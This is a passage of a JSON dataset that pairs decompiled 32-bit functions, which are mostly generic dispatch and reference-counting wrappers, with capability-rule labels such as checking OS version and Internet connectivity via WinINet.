            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00075a40(int32_t **arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    *arg_8h = NULL;\n    var_8h = 0;\n    while( true ) {\n        if (*(arg_ch + var_8h * 4) == 0) {\n            return 0x21590005;\n        }\n        arg_8h_00 = fcn.00035360(*(arg_ch + var_8h * 4));\n        if (arg_8h_00 == NULL) {\n            return 0x21590004;\n        }\n        var_4h = fcn.000785ce(arg_8h_00, 0x2e);\n        if (var_4h != NULL) {\n            *var_4h = 0;\n            var_4h = var_4h + 1;\n        }\n        pcVar3 = arg_8h_00;\n        uVar4 = arg_20h;\n        var_18h = fcn.00075840(arg_8h_00);\n        if (var_18h == 0) {\n            fcn.00035330(arg_8h_00);\n            var_1ch = 0x21590005;\n            if ((*0xb1c460a8 != 0) &&\n               (var_1ch = (**(*0xb1c460a8 + 0xc))\n                                    (arg_8h, *(arg_ch + var_8h * 4), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, pcVar3\n                                     , uVar4),  var_1ch == 0)) {\n                var_18h = *0xb1c460a8;\n            }\n            if (((var_1ch == 0x21590005) && (*0xb1c460b0 != 0)) &&\n               (var_1ch = (**(*0xb1c460b0 + 0xc))\n                                    (arg_8h, *(arg_ch + var_8h * 4), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h), \n               var_1ch == 0)) {\n                var_18h = *0xb1c460b0;\n            }\n            if ((var_18h == 0) && (var_1ch != 0x21590005)) {\n                return var_1ch;\n            }\n        }\n        else {\n            if (var_4h == NULL) {\n                var_20h = arg_8h_00;\n                do {\n                    cVar1 = *var_20h;\n                    var_20h = var_20h + 1;\n                } while (cVar1 != '\\0');\n                var_10h = var_20h - (arg_8h_00 + 1);\n            }\n            else {\n                var_10h = var_4h - arg_8h_00;\n            }\n            fcn.00035330(arg_8h_00);\n            var_1ch = (**(var_18h + 0xc))(arg_8h, *(arg_ch + var_8h * 4) + var_10h, arg_10h, arg_14h, arg_18h, arg_1ch, \n                                          arg_20h);\n        }\n        if (var_18h != 0) break;\n        var_8h = var_8h + 1;\n    }\n    if (var_1ch != 0) {\n        return var_1ch;\n    }\n    if (*arg_8h != NULL) {\n        arg_8h_01 = fcn.00035200(0x20);\n        if (arg_8h_01 == NULL) {\n            (**(var_18h + 0x10))(*arg_8h, 0);\n            (**(var_18h + 0x14))(*arg_8h, 0);\n            *arg_8h = NULL;\n            return 0x21590004;\n        }\n        *arg_8h_01 = var_18h;\n        arg_8h_01[5] = 0;\n        arg_8h_01[6] = 0;\n        fcn.00036a10(arg_8h_01 + 1);\n        fcn.000344f0(arg_8h_01 + 7);\n        **arg_8h = arg_8h_01;\n        iVar2 = fcn.0006cd00(*arg_8h, 2);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        fcn.00036a80(arg_8h_01 + 1);\n        fcn.00034520(arg_8h_01 + 7);\n        fcn.00035330(arg_8h_01);\n        (**(var_18h + 0x10))(*arg_8h, 0);\n        (**(var_18h + 0x14))(*arg_8h, 0);\n        *arg_8h = NULL;\n        return 0x21590004;\n    }\n    (**(var_18h + 0x10))(*arg_8h, 0);\n    (**(var_18h + 0x14))(*arg_8h, 0);\n    return -1;\n}\n",
        "token_count": 1353
    },
    "00075d60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00075d60(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    fcn.00034550(0xb1c5a904);\n    iVar1 = fcn.0006ce50(arg_8h_00, 2);\n    if (iVar1 == 0) {\n        fcn.000345c0(0xb1c5a904);\n        *arg_8h = NULL;\n    }\n    else {\n        arg_8h_01 = *arg_8h_00;\n        if (arg_8h_01[5] == 0) {\n            arg_8h_01[5] = 1;\n            fcn.000345c0(0xb1c5a904);\n            (**(**arg_8h_00 + 0x10))(arg_8h_00, arg_ch);\n            fcn.00036c40(arg_8h_01 + 1);\n            fcn.00034550(0xb1c5a904);\n            *arg_8h = NULL;\n            fcn.0006cd90(arg_8h_00, 2);\n            fcn.000345c0(0xb1c5a904);\n            (**(**arg_8h_00 + 0x14))(arg_8h_00, arg_ch);\n            fcn.00036cd0(arg_8h_01 + 1);\n            fcn.00036a80(arg_8h_01 + 1);\n            fcn.00034520(arg_8h_01 + 7);\n            fcn.00035330(arg_8h_01);\n        }\n        else {\n            fcn.000345c0(0xb1c5a904);\n            *arg_8h = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 461
    },
    "00075e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00075e70(int32_t **arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x1c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x1c) != 0)) {\n            var_4h = (**(**arg_8h + 0x1c))(arg_8h, arg_ch, arg_10h);\n            if (var_4h == 0) {\n                arg_8h_00 = fcn.00035200(0x20);\n                if (arg_8h_00 == NULL) {\n                    fcn.00036b60(*arg_8h + 1);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    return 0x21590004;\n                }\n                *arg_8h_00 = **arg_8h;\n                arg_8h_00[5] = 0;\n                arg_8h_00[6] = 0;\n                fcn.00036a10(arg_8h_00 + 1);\n                fcn.000344f0(arg_8h_00 + 7);\n                **arg_ch = arg_8h_00;\n                iVar1 = fcn.0006cd00(*arg_ch, 2);\n                if (iVar1 == 0) {\n                    fcn.00036a80(arg_8h_00 + 1);\n                    fcn.00034520(arg_8h_00 + 7);\n                    fcn.00035330(arg_8h_00);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    var_4h = 0x21590004;\n                }\n            }\n            else if ((*arg_8h)[5] != 0) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 606
    },
    "00076010": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076010(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        var_4h = fcn.00076b80(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        var_4h = fcn.00076b10(arg_8h);\n        if (var_4h == 0) {\n            if (((**arg_8h + 0x38) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x38) != 0)) {\n                var_4h = (**(**arg_8h + 0x38))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n                if (var_4h == 0) {\n                    var_4h = fcn.00076b80(arg_ch, arg_10h, arg_14h, arg_18h);\n                }\n                fcn.00036b60(*arg_8h + 1);\n            }\n            else {\n                fcn.00036b60(*arg_8h + 1);\n                var_4h = 0x21590001;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 351
    },
    "000760f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000760f0(int32_t **arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x18) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x18) != 0)) {\n            var_4h = (**(**arg_8h + 0x18))(arg_8h, arg_ch);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 265
    },
    "000761b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000761b0(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x20) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x20) != 0)) {\n            var_4h = (**(**arg_8h + 0x20))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 276
    },
    "00076270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076270(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x24) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x24) != 0)) {\n            var_4h = (**(**arg_8h + 0x24))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 275
    },
    "00076330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076330(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x28) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x28) != 0)) {\n            var_4h = (**(**arg_8h + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 286
    },
    "000763f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.000763f0(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x2c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x2c) != 0)) {\n            var_4h = (**(**arg_8h + 0x2c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h == 0) && (*arg_ch != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034550(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.000345c0(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00036b60(*arg_8h + 1);\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 410
    },
    "00076500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.00076500(int32_t **arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, uint *arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x30) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x30) != 0)) {\n            var_4h = (**(**arg_8h + 0x30))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if ((var_4h == 0) && (*arg_14h != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034550(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.000345c0(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00036b60(*arg_8h + 1);\n                *arg_14h = 0;\n                *arg_18h = 0;\n            }\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 432
    },
    "00076610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00076610(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = fcn.0006ce50(arg_8h, 2);\n    if ((iVar2 != 0) && (arg_ch != 0)) {\n        piVar1 = *arg_8h;\n        fcn.00034550(piVar1 + 7);\n        if (piVar1[6] < 1) {\n            fcn.000345c0(piVar1 + 7);\n        }\n        else {\n            piVar1[6] = piVar1[6] + -1;\n            fcn.000345c0(piVar1 + 7);\n            (**(**arg_8h + 0x34))(arg_8h, arg_ch);\n            fcn.00036b60(*arg_8h + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "000766a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000766a0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x3c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x3c) != 0)) {\n            var_4h = (**(**arg_8h + 0x3c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 301
    },
    "00076770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076770(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x40) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x40) != 0)) {\n            var_4h = (**(**arg_8h + 0x40))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 297
    },
    "00076840": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00076840(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.000768b0(arg_8h, arg_ch, arg_10h);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075970(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.00076330(arg_8h, arg_ch_00, var_4h, arg_10h);\n            fcn.00035330(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 199
    },
    "000768b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000768b0(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x44) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x44) != 0)) {\n            var_4h = (**(**arg_8h + 0x44))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 276
    },
    "00076970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00076970(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00076a00(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075970(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.00076500(arg_8h, arg_ch_00, var_4h, arg_10h, arg_14h, arg_18h, arg_1ch);\n            fcn.00035330(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 247
    },
    "00076a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00076a00(int32_t **arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076b10(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x48) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x48) != 0)) {\n            var_4h = (**(**arg_8h + 0x48))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_4h == 0) && (*arg_10h != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034550(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.000345c0(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00036b60(*arg_8h + 1);\n                *arg_10h = 0;\n                *arg_14h = 0;\n            }\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 422
    },
    "00076b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00076b10(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00034550(0xb1c5a904);\n    iVar1 = fcn.0006ce50(arg_8h, 2);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else if (*(*arg_8h + 0x14) == 0) {\n        fcn.00036ab0(*arg_8h + 4);\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    fcn.000345c0(0xb1c5a904);\n    return var_4h;\n}\n",
        "token_count": 187
    },
    "00076b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00076b80(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar1 = false;\n    while( true ) {\n        if (bVar1) {\n            return 0;\n        }\n        uVar2 = arg_8h >> 0x1f;\n        if (*0xb1c46010 == arg_8h) break;\n        if (arg_8h == 0xffffffff) {\n            fcn.00020a20(arg_10h, arg_14h, 0xb1be2a2c, arg_ch);\n        }\n        else if ((arg_8h ^ uVar2) - uVar2 < 0x186a1) {\n            fcn.00020a20(arg_10h, arg_14h, 0xb1be2a2c, arg_ch);\n        }\n        else {\n            fcn.00020a20(arg_10h, arg_14h, 0xb1be2a38, arg_ch);\n        }\n        bVar1 = true;\n    }\n    if (arg_8h == 0xffffffff) {\n        fcn.00020a20(arg_10h, arg_14h, 0xb1be2a10, arg_ch);\n    }\n    else if ((arg_8h ^ uVar2) - uVar2 < 0x186a1) {\n        fcn.00020a20(arg_10h, arg_14h, 0xb1be2a10, arg_ch);\n    }\n    else {\n        fcn.00020a20(arg_10h, arg_14h, 0xb1be2a1c, arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 420
    },
    "00076d00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00076d00(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    var_4h = 0;\n    while( true ) {\n        if (*(arg_ch + var_4h * 4) == 0) {\n            return 0x21590005;\n        }\n        arg_8h_00 = fcn.00035360(*(arg_ch + var_4h * 4));\n        if (arg_8h_00 == NULL) {\n            return 0x21590004;\n        }\n        var_10h = fcn.000785ce(arg_8h_00, 0x2e);\n        if (var_10h != NULL) {\n            *var_10h = 0;\n            var_10h = var_10h + 1;\n        }\n        pcVar3 = arg_8h_00;\n        uVar4 = arg_18h;\n        var_18h = fcn.00075860(arg_8h_00);\n        if (var_18h == 0) {\n            fcn.00035330(arg_8h_00);\n            var_ch = 0x21590005;\n            if ((*0xb1c460ac != 0) &&\n               (var_ch = (**(*0xb1c460ac + 0xc))\n                                   (arg_8h, *(arg_ch + var_4h * 4), arg_10h, arg_14h, arg_18h, pcVar3, uVar4), \n               var_ch == 0)) {\n                var_18h = *0xb1c460ac;\n            }\n            if ((var_18h == 0) && (var_ch != 0x21590005)) {\n                return var_ch;\n            }\n        }\n        else {\n            if (var_10h == NULL) {\n                var_1ch = arg_8h_00;\n                do {\n                    cVar1 = *var_1ch;\n                    var_1ch = var_1ch + 1;\n                } while (cVar1 != '\\0');\n                var_8h = var_1ch - (arg_8h_00 + 1);\n            }\n            else {\n                var_8h = var_10h - arg_8h_00;\n            }\n            fcn.00035330(arg_8h_00);\n            var_ch = (**(var_18h + 0xc))(arg_8h, *(arg_ch + var_4h * 4) + var_8h, arg_10h, arg_14h, arg_18h);\n        }\n        if (var_18h != 0) break;\n        var_4h = var_4h + 1;\n    }\n    if (var_ch != 0) {\n        return var_ch;\n    }\n    iVar2 = fcn.00077090(*arg_8h, var_18h);\n    if (iVar2 != 0) {\n        return 0;\n    }\n    (**(var_18h + 0x18))(*arg_8h, 0);\n    *arg_8h = 0;\n    return 0x21590004;\n}\n",
        "token_count": 838
    },
    "00076ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
